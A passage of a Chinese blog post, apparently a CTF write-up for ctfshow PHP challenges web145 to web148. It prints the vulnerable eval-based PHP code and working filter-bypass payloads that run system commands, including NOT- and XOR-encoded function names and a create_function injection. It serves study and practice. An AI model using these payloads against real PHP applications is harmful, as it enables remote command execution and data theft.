+<h3 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-10-13 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-18 17:41:33<br><br>*/<br><br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;<br>    $v1 = (String)$_GET[&#x27;v1&#x27;];<br>    $v2 = (String)$_GET[&#x27;v2&#x27;];<br>    $v3 = (String)$_GET[&#x27;v3&#x27;];<br>    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;<br>        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;<br>                die(&#x27;get out hacker!&#x27;);<br>        &#125;<br>        else&#123;<br>            $code =  eval(&quot;return $v1$v3$v2;&quot;);<br>            echo &quot;$v1$v3$v2 = &quot;.$code;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">对v3的过滤多了^，那我们不能异或了，我们还有取反绕过<br>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|  #或<br>?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F):  #三元运算符<br></code></pre></td></tr></table></figure>
+
+<h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-10-13 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-18 17:41:33<br><br>*/<br><br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;<br>    $v1 = (String)$_GET[&#x27;v1&#x27;];<br>    $v2 = (String)$_GET[&#x27;v2&#x27;];<br>    $v3 = (String)$_GET[&#x27;v3&#x27;];<br>    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;<br>        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;<br>                die(&#x27;get out hacker!&#x27;);<br>        &#125;<br>        else&#123;<br>            $code =  eval(&quot;return $v1$v3$v2;&quot;);<br>            echo &quot;$v1$v3$v2 = &quot;.$code;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">过滤了: 那我们试试或<br>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|<br></code></pre></td></tr></table></figure>
+
+<h3 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-10-13 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-19 02:04:38<br><br>*/<br><br>highlight_file(__FILE__);<br><br>if(isset($_POST[&#x27;ctf&#x27;]))&#123;<br>    $ctfshow = $_POST[&#x27;ctf&#x27;];<br>    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;<br>        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>先看看代码</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">^：匹配字符串的开头。<br>$：匹配字符串的结尾，确保整个字符串符合规则。<br>[a-z0-9_]：表示允许小写字母、数字和下划线。<br>*：匹配零个或多个前面的字符。<br>/i：忽略大小写。<br>s：匹配包括换行符在内的所有字符。<br>D（PCRE 特有）：美元符号 $ 仅匹配字符串的实际末尾，不匹配结尾的换行符。<br><br>让$ctfshow中有其他字符就可以构造了<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">这里我们用的是creat_function()这个函数<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">$func = create_function(&#x27;$a&#x27;, &#x27;echo $a.&quot;123&quot;;&#x27;);<br>$func(&#x27;Hello&#x27;); // 输出 Hello123<br>#其中 $a 是参数，&#x27;echo $a.&quot;123&quot;;&#x27; 是函数体，但在7.2以后就被弃用了<br><br>等价于<br>function f($a) &#123;<br>  echo $a . &quot;123&quot;;<br>&#125;<br>f(&#x27;Hello&#x27;); // 输出 Hello123<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">#那如果我们输入这个<br>&#125;system(&#x27;ls&#x27;);//<br>#等价于<br>function f($a) &#123;<br>  &#125;system(&#x27;ls&#x27;);//&#125;<br>可以以此来执行命令<br><br>那我们如何调用creat_fuction呢？<br>在 PHP 中，命名空间（namespace）提供了一种组织代码的方式，可以避免类、函数和常量名称的冲突。默认情况下，PHP 的函数和类都在全局命名空间 \ 中。全局命名空间中的函数和类：在任何命名空间中调用全局函数和类时，需要使用绝对路径（以 \ 开头）。 自定义命名空间中的函数和类：在同一命名空间中调用时，可以直接使用名称；在其他命名空间中调用时，需要使用完整的命名空间路径。<br><br>就是说我们/creat_fuction就可以调用了<br>所以我们的payload:<br>?show=&#125;system(&#x27;ls&#x27;);//<br>ctf=\create_function             #双斜杠也可以用/*代替<br></code></pre></td></tr></table></figure>
+
+<h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-10-13 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-19 03:52:11<br><br>*/<br><br>include &#x27;flag.php&#x27;;<br>if(isset($_GET[&#x27;code&#x27;]))&#123;<br>    $code=$_GET[&#x27;code&#x27;];<br>    if(preg_match(&quot;/[A-Za-z0-9_\%\\|~\&#x27;\,\.\:\@\&amp;*\+\- ]+/&quot;,$code))&#123;<br>        die(&quot;error&quot;);<br>    &#125;<br>    @eval($code);<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>function get_ctfshow_fl0g()&#123;<br>    echo file_get_contents(&quot;flag.php&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">异或秒了（记得;闭合）<br>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%03%01%09%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%60%60%7d%21%60%60%60%60%2f%7b%60%7b&quot;);<br><br>预期解是使用中文 <br>?code=$哈=&quot;&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f* <br>&quot;&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" class="category-chain-item">CTF题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/ctfshow/" class="category-chain-item">ctfshow</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
+      
+        <a href="/tags/PHP/" class="print-no-link">#PHP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow PHP 特性题解</div>
+      <div>https://xendr1a.github.io/2025/07/15/ctfshow-php/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/05/ctfshow-sql/" title="ctfshow SQL 注入题解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ctfshow SQL 注入题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/21/%E8%BD%A9%E8%BE%95%E6%9D%AF-%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B-Web/" title="“轩辕杯”云盾砺剑 CTF 挑战赛 Web">
+                        <span class="hidden-mobile">“轩辕杯”云盾砺剑 CTF 挑战赛 Web</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
